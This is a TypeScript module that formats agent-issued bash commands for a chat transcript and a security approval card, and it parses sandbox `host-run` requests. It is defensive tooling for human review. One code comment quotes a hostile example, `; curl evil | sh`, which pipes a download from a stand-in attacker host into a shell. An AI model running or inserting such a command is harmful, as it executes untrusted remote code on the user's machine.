// Control-flow keywords the splitter understands. `do`/`then` close a block
// header and open its body, `done`/`fi`/`esac` close a block, and `else`/`elif`
// do both.
const BLOCK_OPEN = new Set(['do', 'then', 'else'])
const BLOCK_CLOSE = new Set(['done', 'fi', 'esac', 'else', 'elif'])
// Keywords that start a block header, and the keyword that closes that header.
// Everything up to the closer is one condition (or, for a case, one subject), so
// a `;`/`&&`/`||` inside it must NOT start a new line - `if a && b; then` is one
// step, not two.
const BLOCK_HEADER: Record<string, 'block' | 'case'> = {
  for: 'block',
  select: 'block',
  while: 'block',
  until: 'block',
  if: 'block',
  elif: 'block',
  case: 'case',
}

// Spaces a block body is indented by. The user can change it in the Settings
// Browser tab (0 leaves bodies flush left); see lib/chatPrefs.
export const DEFAULT_BASH_INDENT = 4
export const MAX_BASH_INDENT = 8

// Per-character roles a heredoc gives the script. A body is DATA, not shell: a
// `;` ending a line of TypeScript, an apostrophe in a comment and a trailing `\`
// are all literal, so every formatter here copies a body out byte for byte.
// The opener - `<<EOF` up to and including the newline that starts the body - is
// shell, but nothing may be broken onto a new line inside it: the body has to
// follow the line the `<<` sits on, so `cat <<EOF && foo` splitting at the `&&`
// would show a script that no longer means what it did. Everything else is
// ordinary shell text (0).
const HEREDOC_OPENER = 1
const HEREDOC_BODY = 2

// heredocAt reads the `<<`/`<<-` redirection at i, returning its delimiter (with
// any quoting removed, since quoting only suppresses expansion - it never
// changes what terminates the body) and the index just past the delimiter word.
function heredocAt(cmd: string, i: number): { delim: string; strip: boolean; end: number } | null {
  let j = i + 2
  const strip = cmd[j] === '-'
  if (strip) j++
  while (cmd[j] === ' ' || cmd[j] === '\t') j++
  let delim = ''
  while (j < cmd.length) {
    const ch = cmd[j]
    if (ch === '\\' && j + 1 < cmd.length) {
      delim += cmd[j + 1]
      j += 2
      continue
    }
    if (ch === "'" || ch === '"') {
      const close = cmd.indexOf(ch, j + 1)
      if (close < 0) return null
      delim += cmd.slice(j + 1, close)
      j = close + 1
      continue
    }
    if (/[\s;&|<>()]/.test(ch)) break
    delim += ch
    j++
  }
  return delim ? { delim, strip, end: j } : null
}

// heredocFlags labels every character of the script HEREDOC_TEXT / _OPENER /
// _BODY (see above). Quote-aware, and it handles several heredocs queued on one
// line (`cat <<A <<B`) the way bash does: their bodies follow in order.
//
// An arithmetic left shift (`$((1 << 3))`) parses as an opener whose terminator
// never arrives; the rest of the script is then treated as a body, i.e. shown
// exactly as written. That is the same outcome as an unterminated heredoc, and
// leaving text alone is always the safe direction here.
function heredocFlags(cmd: string): Uint8Array {
  const flags = new Uint8Array(cmd.length)
  if (!cmd.includes('<<')) return flags
  const queue: { delim: string; strip: boolean }[] = []
  let openerStart = -1
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (escaped) {
      escaped = false
      continue
    }
    if (ch === '\\' && !inSingle) {
      escaped = true
      continue
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle
      continue
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble
      continue
    }
    if (inSingle || inDouble) continue
    // `<<<` is a here-string - it takes its data from the same line.
    if (ch === '<' && cmd[i + 1] === '<' && cmd[i + 2] !== '<') {
      const doc = heredocAt(cmd, i)
      if (doc) {
        if (!queue.length) openerStart = i
        queue.push(doc)
        i = doc.end - 1
      }
      continue
    }
    if (ch !== '\n' || queue.length === 0) continue
    flags.fill(HEREDOC_OPENER, openerStart, i + 1)
    // Walk whole lines, retiring one queued delimiter per terminator line, until
    // the queue empties or the script ends.
    let j = i + 1
    while (queue.length > 0 && j < cmd.length) {
      let eol = cmd.indexOf('\n', j)
      if (eol < 0) eol = cmd.length
      const line = queue[0].strip ? cmd.slice(j, eol).replace(/^\t+/, '') : cmd.slice(j, eol)
      j = eol + 1
      if (line === queue[0].delim) queue.shift()
    }
    // Stop short of the terminator's own newline so it stays ordinary shell text
    // and the line-break bookkeeping below sees it.
    const end = Math.min(j - 1, cmd.length)
    flags.fill(HEREDOC_BODY, i + 1, Math.max(i + 1, end))
    i = end - 1
    queue.length = 0
    openerStart = -1
  }
  return flags
}

// topLevelStatements cuts a script into the statements the shell runs one after
// another: the pieces separated by `;`, `&&`, `||`, `|`, `&` and newlines at
// paren depth 0, outside quotes and heredoc bodies.
//
// "Top level" is the point. A statement inside `(...)` runs in a SUBSHELL, so
// what it does to the shell's state - a `cd`, an export - dies with it, and a
// heredoc body is data. Used to follow the working directory across a session's
// commands (lib/shellCwd), which is only sound for the statements that actually
// affect the shell.
export function topLevelStatements(cmd: string): string[] {
  const flags = heredocFlags(cmd)
  const out: string[] = []
  let current = ''
  let parens = 0
  let inSingle = false
  let inDouble = false
  let escaped = false
  const push = () => {
    if (current.trim()) out.push(current.trim())
    current = ''
  }
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (flags[i] === HEREDOC_BODY) continue
    if (escaped) {
      current += ch
      escaped = false
      continue
    }
    if (ch === '\\') {
      current += ch
      escaped = true
      continue
    }
    if (ch === "'" && !inDouble) {
      current += ch
      inSingle = !inSingle
      continue
    }
    if (ch === '"' && !inSingle) {
      current += ch
      inDouble = !inDouble
      continue
    }
    if (inSingle || inDouble) {
      current += ch
      continue
    }
    if (ch === '(') parens++
    else if (ch === ')' && parens > 0) parens--
    else if (parens === 0 && (ch === '\n' || ch === ';' || ch === '|' || ch === '&')) {
      push()
      if ((ch === '&' || ch === '|') && cmd[i + 1] === ch) i++
      continue
    }
    current += ch
  }
  push()
  return out
}

// bareWordAt returns the unquoted lowercase word starting at i, provided it is a
// whole token (the character after it delimits). The caller is responsible for
// only asking when i is in command position - in `echo done` the `done` is an
// argument, not a keyword.
function bareWordAt(cmd: string, i: number): string {
  const match = /^[a-z]+/.exec(cmd.slice(i))
  if (!match) return ''
  const after = cmd[i + match[0].length]
  return after === undefined || /[\s;&|()<>]/.test(after) ? match[0] : ''
}

// splitBashChains inserts a newline after each top-level `;`, `&&` and `||` so a
// chained one-liner reads as separate steps, and lays a `for`/`while`/`until`/
// `if`/`case` block out over its own indented lines. `indent` is the number of
// spaces per level (0 leaves bodies flush left). It is deliberately optimistic:
// it only tracks quotes, backslash escapes, heredocs and command position, not
// the full shell grammar.
//
// A script that already has newlines keeps them, and keeps its own indentation -
// the author laid those lines out deliberately, so breaks are only ever ADDED,
// never moved. That matters most for the shape agents write constantly:
// `cd web && cat > f <<'EOF'` followed by a file's worth of code. The first line
// is a chain like any other and now splits, while the heredoc body below it is
// left untouched (see heredocFlags).
//
// It is DISPLAY-ONLY. The only edits it makes are inserting line breaks and
// leading indentation, and dropping the run of spaces that a break just turned
// into trailing whitespace - every other byte of the original command is still
// shown, in the same order. That property is what makes it safe to use on the
// security approval card: the text a user approves is the command that runs;
// splitting merely makes a buried `; curl evil | sh` easier to spot, never
// harder.
export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDENT): string {
  const pad = ' '.repeat(Math.min(MAX_BASH_INDENT, Math.max(0, Math.trunc(indent) || 0)))
  const flags = heredocFlags(cmd)
  let out = ''
  // The next break to emit, flushed lazily so the indent is computed at the
  // depth the line it starts actually sits at (a line opening with `done` has
  // already dropped a level by the time the break is written).
  let pending = ''
  // The open blocks, innermost last: a `do`/`then` body, a `case` whose patterns
  // are being listed, or one `pattern)` arm of a case. Every entry is exactly one
  // indent level, so the stack's depth IS the indent depth.
  const stack: ('block' | 'case' | 'branch')[] = []
  // Unclosed `(` outside quotes, so the `)` that ends a case pattern can be told
  // apart from one closing `$( )` / `( )` / `(( ))`.
  let parens = 0
  let inSingle = false
  let inDouble = false
  let escaped = false
  // Whether the next bare word starts a command - only there is `done` the
  // keyword rather than an argument.
  let commandStart = true
  // Which block header we are inside, if any: between `if`/`for`/... and its
  // `then`/`do`, or between `case` and its `in`. Chain operators there join one
  // condition instead of separating steps.
  let header: '' | 'block' | 'case' = ''
  // Whether the character being read is part of a heredoc opener, which - like a
  // header - cannot be broken across lines.
  let inOpener = false

  const emit = (text: string) => {
    if (pending) {
      out += pending === '\n' ? '\n' + pad.repeat(stack.length) : pending
      pending = ''
    }
    out += text
  }
  // The separator to put before the next step. A `(...)` subshell (or a `$( )`
  // substitution) is ONE step of the script it sits in, so everything inside it
  // stays on that step's line: `(fuser -k 21765/tcp >/dev/null 2>&1; true)` is a
  // single idea - "kill it, ignoring failure" - and breaking it across three
  // lines, with the `)` orphaned, read as three. Same reasoning as a block
  // header, and it applies to every break (a chain operator, a `do`/`then` body,
  // a case arm), so a subshell never straddles lines it did not already.
  const sep = () => (parens > 0 || inOpener ? ' ' : '\n')
  // Whether a break is already there - the output ends with one, or one is
  // pending - so a keyword that opens its own line does not add a blank one when
  // the script was written across lines to begin with.
  const broken = () => pending === '\n' || (pending === '' && /\n[ \t]*$/.test(out))
  // Start the body of a block that the keyword at i just opened, skipping the
  // spaces the break makes trailing.
  const openBody = (i: number, kind: 'block' | 'case') => {
    stack.push(kind)
    header = ''
    pending = sep()
    let j = i
    while (cmd[j + 1] === ' ' || cmd[j + 1] === '\t') j++
    commandStart = true
    return j
  }

  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    // A heredoc body is data: copy it out unread. What follows it is the start of
    // a command again.
    if (flags[i] === HEREDOC_BODY) {
      out += ch
      commandStart = true
      continue
    }
    inOpener = flags[i] === HEREDOC_OPENER
    if (escaped) {
      emit(ch)
      escaped = false
      continue
    }
    if (ch === '\\') {
      emit(ch)
      escaped = true
      commandStart = false
      continue
    }
    if (ch === "'" && !inDouble) {
      emit(ch)
      inSingle = !inSingle
      commandStart = false
      continue
    }
    if (ch === '"' && !inSingle) {
      emit(ch)
      inDouble = !inDouble
      commandStart = false
      continue
    }
    if (inSingle || inDouble) {
      emit(ch)
      continue
    }

    // A newline the author wrote is the break itself: it satisfies any pending
    // one, and the indentation of the line it starts is theirs to choose.
    if (ch === '\n') {
      pending = ''
      out += ch
      commandStart = true
      continue
    }

    // `case <subject> in`: the `in` closes the header, and unlike `do`/`then` it
    // follows the subject rather than sitting in command position - so it is
    // matched on a plain word boundary. `for x in ...` is unaffected: its header
    // is a 'block' one, closed by `do`.
    if (header === 'case' && bareWordAt(cmd, i) === 'in' && (i === 0 || /[\s;&|()]/.test(cmd[i - 1]))) {
      emit('in')
      i = openBody(i + 1, 'case')
      continue
    }

    const keyword = commandStart ? bareWordAt(cmd, i) : ''
    if (keyword && (BLOCK_OPEN.has(keyword) || BLOCK_CLOSE.has(keyword) || keyword in BLOCK_HEADER)) {
      if (BLOCK_CLOSE.has(keyword)) {
        // The final `;;` of a case is optional, so `esac` may still be inside the
        // last arm - leave that arm before closing the case itself.
        if (keyword === 'esac' && stack[stack.length - 1] === 'branch') stack.pop()
        stack.pop()
        header = ''
        if (out && !broken()) pending = sep()
      }
      emit(keyword)
      i += keyword.length - 1
      commandStart = false
      if (keyword in BLOCK_HEADER) header = BLOCK_HEADER[keyword]
      if (BLOCK_OPEN.has(keyword)) i = openBody(i, 'block')
      continue
    }

    // The `)` that ends a case pattern opens that arm: its first command stays on
    // the pattern line (`a) echo a ;;` is the whole point of a one-line case) and
    // any further command in the arm indents under it. A `(a|b)` pattern works
    // because a `(` in pattern position is part of the pattern, not a subshell.
    const inPatterns = stack[stack.length - 1] === 'case'
    if (ch === '(' && !(inPatterns && commandStart)) {
      emit(ch)
      parens++
      commandStart = true
      continue
    }
    if (ch === ')') {
      emit(ch)
      commandStart = false
      if (parens > 0) parens--
      else if (inPatterns) {
        stack.push('branch')
        commandStart = true
      }
      continue
    }

    // `;;` - and the `;&` / `;;&` fall-through spellings - end a case arm.
    const terminator = /^(?:;;&|;;|;&)/.exec(cmd.slice(i, i + 3))?.[0]
    if (terminator) {
      emit(terminator)
      i += terminator.length - 1
      if (stack[stack.length - 1] === 'branch') stack.pop()
      while (cmd[i + 1] === ' ' || cmd[i + 1] === '\t') i++
      commandStart = true
      if (i + 1 < cmd.length) pending = sep()
      continue
    }

    // `;` splits; `&&`/`||` split after the second character. A single `|` (pipe)
    // or `&` (background/redirect) does not, though both still put what follows
    // in command position.
    const isChain = ch === ';' || ((ch === '&' || ch === '|') && cmd[i + 1] === ch)
    if (!isChain) {
      emit(ch)
      if (/[&|{!]/.test(ch)) commandStart = true
      else if (!/\s/.test(ch)) commandStart = false
      continue
    }
    emit(ch)
    if (ch !== ';') emit(cmd[++i])
    while (cmd[i + 1] === ' ' || cmd[i + 1] === '\t') i++
    commandStart = true
    if (i + 1 >= cmd.length) continue
    // Keep the conventional error-suppression suffixes attached to the command
    // they qualify. Splitting `command -v bun || true` (or `... || :`) leaves a
    // visually orphaned no-op on its own line and makes the script harder, not
    // easier, to scan. Other control chains still split normally.
    const rest = cmd.slice(i + 1).trim()
    // The no-op need not be the end of the whole script. In
    // `command -v codex || true && codex --help`, it still belongs to the
    // command immediately before it; the following `&&` gets its own ordinary
    // break when the scanner reaches it.
    const trivialFallback = ch === '|' && /^(?:true|:)(?=$|\s*(?:&&|\|\||;|\n))/.test(rest)
    pending = header || trivialFallback ? ' ' : sep()
  }
  return out
}

// Codex reports shell commands as the argv-style launcher it executed, commonly
// `/usr/bin/bash -lc '<script>'`. The wrapper is implementation detail, so show
// the script itself while retaining the untouched item behind the tool card's
// Raw toggle. App-server also reports the equivalent `-c` form and, depending
// on platform/launch path, spells the executable as bash, /bin/bash, or
// /usr/bin/bash. Unquoted remainders are accepted because this is a display
// formatter for the provider's command string, not an argv parser.
function parseOneShellWord(source: string): string | null {
  let out = ''
  let quote: "'" | '"' | null = null
  let escaped = false
  let started = false
  for (let i = 0; i < source.length; i++) {
    const ch = source[i]
    if (escaped) {
      out += ch
      escaped = false
      started = true
      continue
    }
    if (quote === "'") {
      if (ch === "'") quote = null
      else out += ch
      started = true
      continue
    }
    if (quote === '"') {
      if (ch === '"') quote = null
      else if (ch === '\\' && /[\\"$`\n]/.test(source[i + 1] ?? '')) escaped = true
      else out += ch
      started = true
      continue
    }
    if (ch === "'" || ch === '"') {
      quote = ch
      started = true
    } else if (ch === '\\') {
      escaped = true
      started = true
    } else if (/\s/.test(ch)) {
      if (started && source.slice(i).trim()) return null
    } else {
      out += ch
      started = true
    }
  }
  return quote || escaped || !started ? null : out
}

function unwrapOneBashCommand(command: string): string {
  const match = command.match(/^(?:\/usr\/bin\/|\/bin\/)?bash\s+-(?:l)?c\s+([\s\S]+)$/)
  if (!match) return command
  const arg = match[1].trim()
  if (!arg) return command
  return parseOneShellWord(arg) ?? arg
}

export function unwrapBashLoginCommand(command: string): string {
  let current = command
  for (let depth = 0; depth < 3; depth++) {
    const next = unwrapOneBashCommand(current)
    if (next === current) break
    current = next
  }
  return current
}

// stripLineContinuations drops the trailing `\` from a `\`-newline pair so a
// multi-line script reads as plain lines instead of carrying the escape noise.
// The line break itself is kept (bash would join the lines, but the author wrote
// them apart deliberately), and leading/trailing blank lines - e.g. the lone `\`
// some agents emit before the first real line - are removed.
//
// Quote-aware: inside single quotes a backslash is literal, so `\`-newline there
// is left alone - as is one inside a heredoc body, which is data. Unlike
// splitBashChains this DOES remove characters, so it is for the chat transcript
// only, never the approval card.
export function stripLineContinuations(cmd: string): string {
  if (!cmd.includes('\n')) return cmd
  const flags = heredocFlags(cmd)
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (flags[i] === HEREDOC_BODY) {
      out += ch
      continue
    }
    if (escaped) {
      out += ch
      escaped = false
      continue
    }
    if (ch === '\\' && !inSingle) {
      if (cmd[i + 1] === '\n') {
        // Also drop the space that separated the backslash from the command, so
        // the line does not end in trailing whitespace.
        out = out.replace(/[ \t]+$/, '')
        continue
      }
      escaped = true
      out += ch
      continue
    }
    if (ch === "'" && !inDouble) inSingle = !inSingle
    else if (ch === '"' && !inSingle) inDouble = !inDouble
    out += ch
  }
  return out.replace(/^\s*\n/, '').trimEnd()
}

// dropRedundantSemicolons removes a `;` that sits immediately before a newline
// (allowing trailing spaces) or at the very end of the script - once a chain has
// been split onto separate lines, `cmd;` + newline is exactly `cmd` + newline in
// bash, so the `;` is pure noise. Quote-aware, and it never touches a `;;` case
// terminator, and never one inside a heredoc body - a line of TypeScript ending
// in `;` is not a shell separator. Display-only (chat, not the approval card)
// since it removes characters.
export function dropRedundantSemicolons(cmd: string): string {
  const flags = heredocFlags(cmd)
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (flags[i] === HEREDOC_BODY) {
      out += ch
      continue
    }
    if (escaped) {
      out += ch
      escaped = false
      continue
    }
    if (ch === '\\' && !inSingle) {
      escaped = true
      out += ch
      continue
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle
      out += ch
      continue
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble
      out += ch
      continue
    }
    // Skip a lone `;` (not part of `;;`) when only whitespace remains before the
    // next newline or the end of the script; drop that trailing whitespace too.
    if (ch === ';' && !inSingle && !inDouble && cmd[i - 1] !== ';' && cmd[i + 1] !== ';') {
      let j = i + 1
      while (cmd[j] === ' ' || cmd[j] === '\t') j++
      if (j >= cmd.length || cmd[j] === '\n') {
        i = j - 1
        continue
      }
    }
    out += ch
  }
  return out
}

// HOST_RUN matches the sandbox escape hatch an agent runs to ask for a command
// on the host - `hydra host-run -- <command>`, however the binary is spelled
// (`/tmp/hydra-internal`, a worktree-local `./hydra`, a bare `hydra`).
const HOST_RUN = /^\s*(?:[\w./-]*\/)?hydra(?:-internal)?\s+host-run\s+(?:--\s+)?([\s\S]+)$/

// hostRunArgv trims `rest` to the part the SANDBOX shell actually hands to
// host-run as argv: everything up to the first unquoted control operator
// (`|`, `||`, `&&`, `;`, `&`, newline) or redirection (`2>&1`, `> log`), which
// the shell consumes itself and never passes on.
//
// Without this the chat card read `host-run --help 2>&1 | head -20` as a host
// command of `--help 2>&1 | head -20` while the approval card - built from the
// CLI's real argv - said `--help`. The card was right: the pipe runs INSIDE the
// sandbox, against host-run's own output. Two surfaces disagreeing about what
// will run on the host is the one thing this feature cannot afford.
function hostRunArgv(rest: string): string {
  let quote: "'" | '"' | null = null
  let escaped = false
  let tokenStart = 0
  for (let i = 0; i < rest.length; i++) {
    const ch = rest[i]
    if (escaped) {
      escaped = false
      continue
    }
    if (ch === '\\') {
      escaped = true
      continue
    }
    if (quote) {
      if (ch === quote) quote = null
      continue
    }
    if (ch === "'" || ch === '"') {
      quote = ch
      continue
    }
    if (/\s/.test(ch)) {
      tokenStart = i + 1
      continue
    }
    // A control operator ends the invocation; everything after is the sandbox's.
    if (ch === '|' || ch === '&' || ch === ';' || ch === '\n') return rest.slice(0, i)
    // A redirection takes its whole token with it - `2>&1` starts at the `2`, so
    // cut back to where the current word began rather than at the `>`.
    if (ch === '<' || ch === '>') return rest.slice(0, tokenStart)
  }
  return rest
}

// parseHostRunScript returns the command a `hydra host-run` invocation is asking
// the user to run on the host, or null when the command isn't a host-run at all.
// Shell syntax the sandbox consumes is dropped (see hostRunArgv), the
// `bash -c '<script>'` wrapper agents habitually add is unwrapped, and a whole
// script passed as one quoted argument is unquoted - all three mirror what the
// CLI does when it renders the request, so the chat shows the same text the
// approval card asks about.
export function parseHostRunScript(command: string): string | null {
  const match = command.match(HOST_RUN)
  if (!match) return null
  const rest = stripHostRunFlags(hostRunArgv(match[1]).trim())
  if (!rest) return null
  const unwrapped = unwrapBashLoginCommand(rest)
  if (unwrapped !== rest) return unwrapped
  return parseOneShellWord(rest) ?? rest
}

// HOST_RUN_WHY matches the leading `--why`/`--description` option (in either the
// `--why <text>` or `--why=<text>` form) and the `--` separator that may follow
// it. The explanation is the agent's prose, shown in its own right by the
// approval card - it is not part of the command, so it never belongs in the box
// labelled "command to run on the host". Mirrors takeWhyFlag in internal/cli.
const HOST_RUN_WHY = /^(?:--(?:why|description)(?:=(?:'[^']*'|"[^"]*"|\S*)|\s+(?:'[^']*'|"[^"]*"|\S+))\s*)+(?:--\s+)?/

function stripHostRunFlags(rest: string): string {
  return rest.replace(HOST_RUN_WHY, '').trim()
}

// dropNoopCd removes a leading `cd .` (or `cd ./`, quoted or not) together with
// the `&&` / `;` / newline that chains it to the real command. Changing to `.`
// is a no-op, so the prefix is pure noise - and worse, it makes the script look
// like it already has a `cd`, which suppresses the real working-directory
// preamble below. A command that is *only* `cd .` is left as written; there
// would be nothing left to show. Display-only (chat, not the approval card)
// since it removes characters.
export function dropNoopCd(cmd: string): string {
  let out = cmd
  for (;;) {
    const next = out.replace(/^[ \t]*cd[ \t]+(['"]?)\.\/?\1[ \t]*(?:&&|;|\n)[ \t\n]*/, '')
    if (next === out || !next.trim()) return out
    out = next
  }
}

function quoteShellPath(path: string): string {
  return /^[A-Za-z0-9_./-]+$/.test(path) ? path : `'${path.replace(/'/g, `'"'"'`)}'`
}

export function formatBashForDisplay(command: string, cwd?: string, indent: number = DEFAULT_BASH_INDENT): string {
  const script = dropRedundantSemicolons(splitBashChains(dropNoopCd(stripLineContinuations(unwrapBashLoginCommand(command))), indent))
  if (!cwd || cwd === '.' || /^\s*cd(?:\s|$)/.test(script)) return script
  return `cd ${quoteShellPath(cwd)}\n${script}`
}
